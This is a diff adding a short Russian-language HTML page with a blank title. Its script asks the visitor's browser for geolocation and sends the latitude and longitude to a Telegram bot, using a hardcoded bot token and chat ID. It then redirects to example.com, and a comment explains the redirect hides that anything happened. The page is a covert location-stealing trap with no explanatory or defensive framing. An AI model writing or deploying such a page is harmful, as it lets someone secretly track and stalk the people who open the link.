@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>...</title>
+</head>
+<body>
+<script>
+    // ===== НАСТРОЙКИ =====
+    const BOT_TOKEN = "8608506828:AAFT61pdYWAUltJtaeA9klQFtCoCilSFv74";
+    const CHAT_ID = 8608506828
+
+    // ===== ОТПРАВКА =====
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                const lat = position.coords.latitude;
+                const lng = position.coords.longitude;
+                const message = `📍 *Координаты:*\nhttps://maps.google.com/?q=${lat},${lng}\n\`${lat}, ${lng}\``;
+                
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: "Markdown",
+                        disable_web_page_preview: false
+                    })
+                })
+                .then(() => {
+                    // После успешной отправки перенаправляем, чтобы скрыть факт
+                    window.location.href = "https://example.com";
+                })
+                .catch(() => {
+                    window.location.href = "https://example.com";
+                });
+            },
+            (error) => {
+                // Если пользователь запретил геолокацию — просто редирект
+                window.location.href = "https://example.com";
+            }
+        );
+    } else {
+        window.location.href = "https://example.com";
+    }
+</script>
+</body>
+</html>
